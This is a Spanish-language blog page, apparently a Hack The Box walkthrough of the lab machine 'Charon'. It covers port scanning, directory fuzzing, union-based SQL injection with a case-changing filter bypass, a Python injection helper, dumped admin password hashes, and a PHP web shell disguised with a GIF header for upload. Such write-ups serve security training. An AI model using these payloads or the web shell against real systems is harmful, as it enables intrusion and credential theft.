<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>            Hack The Box Charon - K4miyo      Ciberseguridad!      </title>
<meta name="description" content="Resolución de la máquina Charon en la plataforma de Hack The Box">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
<meta property="og:title" content="Hack The Box Charon">
<meta property="og:url" content="http://localhost:4000/htb-obscurity/">


  <meta property="og:description" content="Resolución de la máquina Charon en la plataforma de Hack The Box">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-charon/charon.jpg">





  <meta property="article:published_time" content="2022-01-11T00:00:00-06:00">





  

  


<link rel="canonical" href="http://localhost:4000/htb-obscurity/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "K4miyo",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Artículos</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categorías</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Etiquetas</a>
            </li><li class="masthead__menu-item">
              <a href="/buscador/" >Buscador</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >Contacto</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Hack The Box Charon</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">K4miyo</h3>
    
    
      <p class="author__bio" itemprop="description">
        Cyber Threat Intelligence Analyst
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box Charon">
    <meta itemprop="description" content="Resolución de la máquina Charon en la plataforma de Hack The Box">
    <meta itemprop="datePublished" content="January 11, 2022">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Charon
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-01-11T00:00:00-06:00">January 11, 2022 </time>&emsp;
          
          
        </p>
        <p><img src="/assets/images/htb-charon/banner-charon.jpg" alt="" /></p>

<h2 id="charon">Charon</h2>
<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.31.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.31
PING 10.10.10.31 <span class="o">(</span>10.10.10.31<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.10.31: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>142 ms

<span class="nt">---</span> 10.10.10.31 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 142.073/142.073/142.073/0.000 ms
</code></pre></div></div>

<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.31 <span class="nt">-oG</span> allPorts
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-09 20:17 CST
Initiating SYN Stealth Scan at 20:17
Scanning 10.10.10.31 <span class="o">[</span>65535 ports]
Discovered open port 22/tcp on 10.10.10.31
Discovered open port 80/tcp on 10.10.10.31
Completed SYN Stealth Scan at 20:17, 26.47s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.10.31
Host is up, received user-set <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2022-01-09 20:17:33 CST <span class="k">for </span>26s
Not shown: 65533 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>26.54 seconds
           Raw packets sent: 131086 <span class="o">(</span>5.768MB<span class="o">)</span> | Rcvd: 20 <span class="o">(</span>880B<span class="o">)</span>
</code></pre></div></div>

<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
───────┬─────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────
   1   │ 
   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
   3   │ 
   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.31
   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 22,80
   6   │ 
   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
</code></pre></div></div>

<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.10.31 <span class="nt">-oN</span> targeted
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-09 20:18 CST
Nmap scan report <span class="k">for </span>10.10.10.31
Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 09:c7:fb:a2:4b:53:1a:7a:f3:30:5e:b8:6e:ec:83:ee <span class="o">(</span>RSA<span class="o">)</span>
|   256 97:e0:ba:96:17:d4:a1:bb:32:24:f4:e5:15:b4:8a:ec <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 e8:9e:0b:1c:e7:2d:b6:c9:68:46:7c:b3:32:ea:e9:ef <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Frozen Yogurt Shop
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>12.42 seconds
</code></pre></div></div>

<p>Vemos el puerto 80 abierto, así que comos simpre vamos a ver a lo que nos enfrentamos con la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code> antes de ver su contenido vía web.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.31/
http://10.10.10.31/ <span class="o">[</span>200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.31], PoweredBy[:], Script[text/javascript], Title[Frozen Yogurt Shop]
</code></pre></div></div>

<p>No vemos nada interesante, asi que ahora si vamos a valir vía web.</p>

<p><img src="/assets/images/htb-charon/charon-web.png" alt="" /></p>

<p>Analizando un poco el sitio web, vemos que tenemos las opciones <strong>HOME</strong>, <strong>ABOUT</strong> y <strong>BLOG</strong>. Dentro de <strong>BLOG</strong> tenemos algunas opciones que si seleccionamos, tenemos en la dirección URL el parámetro <code class="language-plaintext highlighter-rouge">id</code>.</p>

<p><img src="/assets/images/htb-charon/charon-web1.png" alt="" /></p>

<p><img src="/assets/images/htb-charon/charon-web2.png" alt="" /></p>

<p>Si cambianos el valor del <code class="language-plaintext highlighter-rouge">id</code>, tenemos que cambia lo que visualizamos vía web y para este caso, sólo tenemos las opciones 10, 11 y 12; para las demás opciones, el texto desaparece. Por lo tanto, podríamos pensar en realizar una inyección SQL (<strong><em>SQLi</em></strong>):</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">http://10.10.10.31/singlepost.php?id=10'-- -</code> No vemos nada.</li>
  <li><code class="language-plaintext highlighter-rouge">http://10.10.10.31/singlepost.php?id=10' order by 100-- -</code> No se nos visualiza nada.</li>
  <li><code class="language-plaintext highlighter-rouge">http://10.10.10.31/singlepost.php?id=10 and sleep(5)-- -</code> Vemos que el navegador tarda 5 segundos en responder, por lo tanto el sitio es vulnerabla a ataques de tipo SQLi basado en tiempo.</li>
</ul>

<p>Como vemos que el recurso es vulnerable a SQLi basado en tiempo. Pensando un poco, podríamos intuir que existen algún gestor de contenido o un panel de login debido a que por detrar está presenta una base de datos. Asi que vamos a tratar de descubrir rutas dentro del servidor web.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-L</span> <span class="nt">-t</span> 200 <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hw</span><span class="o">=</span>191 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.10.31/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.31/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000016:   403        11 L     32 W       293 Ch      "images"                                                        
000000550:   403        11 L     32 W       290 Ch      "css"                                                           
000000953:   403        11 L     32 W       289 Ch      "js"                                                            
000001112:   403        11 L     32 W       294 Ch      "include"                                                       
000002771:   403        11 L     32 W       292 Ch      "fonts"                                                         
000047682:   403        11 L     32 W       294 Ch      "cmsdata"                                                       
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 112.0082
Processed Requests: 61385
Filtered Requests: 61379
Requests/sec.: 548.0399
</span></code></pre></div></div>

<p>Vemos un recurso intersante llamado <code class="language-plaintext highlighter-rouge">cmsdata</code>; sin embargo, tiene un código de estado 403 (Forbidden). Pensando un poco, es posible que podamos obtener recursos dentro de ese directorio que nos regrese un código de estado 200. Así que lo primero que haremos, es buscar archivos de extensión php.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-L</span> <span class="nt">-t</span> 200 <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hw</span><span class="o">=</span>32 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.10.31/cmsdata/FUZZ.php
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.31/cmsdata/FUZZ.php
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000282:   200        97 L     606 W      6426 Ch     "menu"                                                          
000000366:   200        97 L     606 W      6426 Ch     "upload"                                                        
000000053:   200        97 L     606 W      6426 Ch     "login"                                                         
000001706:   200        96 L     596 W      6322 Ch     "forgot"                                                        
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 7160
Filtered Requests: 7156
Requests/sec.: 0
</span></code></pre></div></div>

<p>Aqui ya tenemos unos archivos que ya debería de llamarnos la atención sería <code class="language-plaintext highlighter-rouge">login.php</code>; asi que vamos a echarle un ojo.</p>

<p><img src="/assets/images/htb-charon/charon-web3.png" alt="" /></p>

<p>Podríamos tratar de ingresar credenciales default o típicas; sin embargo, no vamos a conseguir nada. Como sabemos que el sitio es vulnerable a ataques de SQLi, vamos a tratar de inyectar algunos comandos. Para el panel de login no logramos nada; pero si intentamos sobre el recurso <code class="language-plaintext highlighter-rouge">forgot.php</code>, vemos que se nos muestra una leyenda <strong>Incorrect format</strong></p>

<p><img src="/assets/images/htb-charon/charon-web4.png" alt="" /></p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">' order by 100-- -</code> - Incorrect format</li>
  <li><code class="language-plaintext highlighter-rouge">test@test.com' order by 100-- -</code> - Error in Database!</li>
</ul>

<p>Con la inyección anterior, vemos un resultado diferente.</p>

<p><img src="/assets/images/htb-charon/charon-web5.png" alt="" /></p>

<p>Para trabajar de una forma más cómoda y poder realizar pruebas, vamos a generar un script en python que nos permita realizar las consultas que necesitemos.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
#coding:utf-8
</span>
<span class="kn">import</span> <span class="nn">signal</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">requests</span><span class="p">,</span> <span class="n">re</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Saliendo..."</span><span class="p">)</span>
    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>

<span class="c1"># Variables globales
</span><span class="n">url</span> <span class="o">=</span> <span class="s">"http://10.10.10.31/cmsdata/forgot.php"</span>

<span class="k">def</span> <span class="nf">makeRequest</span><span class="p">(</span><span class="n">sqli_data</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s">"email"</span> <span class="p">:</span> <span class="s">"</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">sqli_data</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
        <span class="p">}</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r'h2.*'</span><span class="p">,</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">lstrip</span><span class="p">()</span>
        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s">"Ha ocurrido un error!"</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">sqli_data</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Email: "</span><span class="p">)</span>
        <span class="n">makeRequest</span><span class="p">(</span><span class="n">sqli_data</span><span class="p">)</span>


</code></pre></div></div>

<p>Una vez que tenemos nuestro script, vamos a realizar algunas pruebas.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 sqli_charon.py
Email: <span class="nb">test</span>@test.com<span class="s1">' order by 100-- -
[*] Error in Database!    
Email: test@test.com'</span> order by 10-- -
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Error <span class="k">in </span>Database!    
Email: <span class="nb">test</span>@test.com<span class="s1">' order by 9-- -
[*] Error in Database!    
Email: test@test.com'</span> order by 7-- -
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Error <span class="k">in </span>Database!    
Email: <span class="nb">test</span>@test.com<span class="s1">' order by 5-- -
[*] Error in Database!    
Email: test@test.com'</span> order by 4-- -
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User not found with that email!    
Email:
</code></pre></div></div>

<p>Para el valor 4, vemos que la respuesta cambia de <strong>Error in Database</strong> a <strong>User not found with that email!</strong>; por lo tanto podríamos pensar que la tabla de la base de datos presenta 4 columnas.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Email: <span class="nb">test</span>@test.com<span class="s1">' union select 1,2,3,4-- -
[-] Ha ocurrido un error!
Email:
</span></code></pre></div></div>

<p>Cuando queremos ejecutar la sentencia <code class="language-plaintext highlighter-rouge">union select</code>, vemos que ocurre un error; por lo tanto vamos a ocupar un tipo de evasión ya que se observa que hay palabras o caracteres que al servidor no le gusta.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Email: <span class="nb">test</span>@test.com<span class="s1">' UNion select 1,2,3,4-- -
[*] Incorrect format    
Email:
</span></code></pre></div></div>

<p>Vemos que al cambiar unas letras a mayúsculas, ya le gusta al servidor; sin embargo, ya no tenemos la respuesta de <strong>User not found with that email!</strong>; por lo que podrían existir caracteres que no le gustan, pero antes de listar con todas las letras del abecedario, vamos a tratar primero los caracteres especiales.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Email: <span class="nb">test</span>@test.com<span class="s1">' UNion select 1,2,3,"a"-- -
[*] Error in Database!    
Email: test@test.com'</span> UNion <span class="k">select </span>1,2,3,<span class="s2">"b"</span><span class="nt">--</span> -
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Error <span class="k">in </span>Database!    
Email: <span class="nb">test</span>@test.com<span class="s1">' UNion select 1,2,3,"c"-- -
[*] Error in Database!    
Email:  
</span></code></pre></div></div>

<p>Para hacer un barrido sobre los caracteres especiales, hacremos uso del archivo <code class="language-plaintext highlighter-rouge">/opt/SecLists/Fuzzing/special-chars.txt</code> (que en caso de no tenerlo, podemos descargar <a href="https://github.com/danielmiessler/SecLists">SecLists</a> y lo guardamos en <code class="language-plaintext highlighter-rouge">/opt/</code>). Como la respuesta no es la que buscamos, vamos a tratar de hacer combinaciones de caracteres especiales. Pero para este caso vamos a utilizar la herramienta <a href="https://portswigger.net/burp">BurpSuite</a></p>

<p><img src="/assets/images/htb-charon/charon-burp.png" alt="" /></p>

<p>Vemos que la combinación <code class="language-plaintext highlighter-rouge">@</code> y <code class="language-plaintext highlighter-rouge">.</code> generan una respuesta <strong>Email sent to:</strong>, por lo que podriamos pensar que dichos símbolos son necesarios cuando queramos hacer una inyección. Ahora vamos a tratar de obtener el nombre de la base de datos a través del comando <code class="language-plaintext highlighter-rouge">database()</code> y <code class="language-plaintext highlighter-rouge">concat</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 sqli_charon.py
Email: <span class="nb">test</span>@test.com<span class="s1">' UNion select 1,2,3,concat(database(),"@.")-- -
[*] Email sent to: supercms@.=
Email:  
</span></code></pre></div></div>

<p>Tenemos el nombre de la base de datos <code class="language-plaintext highlighter-rouge">supercms</code>; por lo que ya encontramos una forma de dumpear la base de datos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 sqli_charon.py
Email: <span class="nb">test</span>@test.com<span class="s1">' UNion select 1,2,3,concat(database(),"@.")-- -
[*] Email sent to: supercms@.=
Email: test@test.com'</span> UNion <span class="k">select </span>1,2,3,concat<span class="o">(</span>user<span class="o">()</span>,<span class="s2">"@."</span><span class="o">)</span><span class="nt">--</span> -
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Email sent to: supercms@localhost@.<span class="o">=</span>
Email: <span class="nb">test</span>@test.com<span class="s1">' UNion select 1,2,3,concat(table_name,"@.") from information_schema.tables where table_schema="supercms" limit 1,1-- -
[*] Email sent to: license@.=
Email: test@test.com'</span> UNion <span class="k">select </span>1,2,3,concat<span class="o">(</span>table_name,<span class="s2">"@."</span><span class="o">)</span> from information_schema.tables where <span class="nv">table_schema</span><span class="o">=</span><span class="s2">"supercms"</span> limit 2,1-- -
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Email sent to: operators@.<span class="o">=</span>
Email: <span class="nb">test</span>@test.com<span class="s1">' UNion select 1,2,3,concat(table_name,"@.") from information_schema.tables where table_schema="supercms" limit 3,1-- -
[*] User not found with that email!    
Email: 
</span></code></pre></div></div>

<p>Ya tenemos las tablas que componen la base de datos <code class="language-plaintext highlighter-rouge">supercms</code> que son <code class="language-plaintext highlighter-rouge">license</code> y <code class="language-plaintext highlighter-rouge">operators</code>. Aqui ya nos llama más la atención la segunda tabla, así que vamos a listar las columnas de dicha tabla:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Email: <span class="nb">test</span>@test.com<span class="s1">' UNion select 1,2,3,concat(column_name,"@.") from information_schema.columns where table_name="operators" limit 1,1-- -
[*] Email sent to: __username_@.=
Email: test@test.com'</span> UNion <span class="k">select </span>1,2,3,concat<span class="o">(</span>column_name,<span class="s2">"@."</span><span class="o">)</span> from information_schema.columns where <span class="nv">table_name</span><span class="o">=</span><span class="s2">"operators"</span> limit 2,1-- -
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Email sent to: __password_@.<span class="o">=</span>
Email: <span class="nb">test</span>@test.com<span class="s1">' UNion select 1,2,3,concat(column_name,"@.") from information_schema.columns where table_name="operators" limit 3,1-- -
[*] Email sent to: email@.=
Email: test@test.com'</span> UNion <span class="k">select </span>1,2,3,concat<span class="o">(</span>column_name,<span class="s2">"@."</span><span class="o">)</span> from information_schema.columns where <span class="nv">table_name</span><span class="o">=</span><span class="s2">"operators"</span> limit 4,1-- -
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User not found with that email!    
Email:  
</code></pre></div></div>

<p>Ya tenemos las columnas de la tabla <code class="language-plaintext highlighter-rouge">operators</code>, las cuales son: <code class="language-plaintext highlighter-rouge">__username_</code>, <code class="language-plaintext highlighter-rouge">__password_</code> y <code class="language-plaintext highlighter-rouge">email</code>. Por lo tanto, lo que nos queda es listar los datos de dichas columnas.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> Email sent to: test51:5f4dcc3b5aa765d61d8327deb882cf99@.<span class="o">=</span>
Email: <span class="nb">test</span>@test.com<span class="s1">' UNion select 1,2,3,concat(__username_,0x3a,__password_,"@.") from operators limit 100,1-- -
[*] Email sent to: test101:5f4dcc3b5aa765d61d8327deb882cf99@.=
Email: test@test.com'</span> UNion <span class="k">select </span>1,2,3,concat<span class="o">(</span>__username_,0x3a,__password_,<span class="s2">"@."</span><span class="o">)</span> from operators limit 200,1-- -
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Email sent to: super_cms_adm:0b0689ba94f94533400f4decd87fa260@.<span class="o">=</span>
Email:
</code></pre></div></div>

<p>Vemos varios usuarios, pero ya tenemos uno que nos debe llamar mucho la atención: <code class="language-plaintext highlighter-rouge">super_cms_adm</code> y tenemos su contraseña hasheada; por lo que vamos a crackearla con la herramienta online <a href="https://crackstation.net/">crackstation</a></p>

<p><img src="/assets/images/htb-charon/charon-hash.png" alt="" /></p>

<p>Ya tenemos unas credenciales a probar, así que validaremos en el panel de login (<strong>Nota</strong>: Simpre guardar las credenciales que vayamos encontrando):</p>

<p><img src="/assets/images/htb-charon/charon-web6.png" alt="" /></p>

<p>Aqui algo que ya nos llama la atención es que podemos super archivos y en específico, imágenes.</p>

<p><img src="/assets/images/htb-charon/charon-web7.png" alt="" /></p>

<p>Vamos a tratar de subir un archivo php el cual nos ayude a ejecutar comandos a nivel de sistema.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
        <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span> <span class="o">.</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="o">.</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p><img src="/assets/images/htb-charon/charon-web8.png" alt="" /></p>

<p>Vamos a cambiar la cabezara de nuestro archivo para que sea considerado como un GIF.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GIF8;
<span class="cp">&lt;?php</span>
        <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span> <span class="o">.</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="o">.</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>Pero vemos que nos sigue mandanlo lo mismo, por lo que cambiaremos la extensión de nuestro archivo.</p>

<p><img src="/assets/images/htb-charon/charon-web9.png" alt="" /></p>

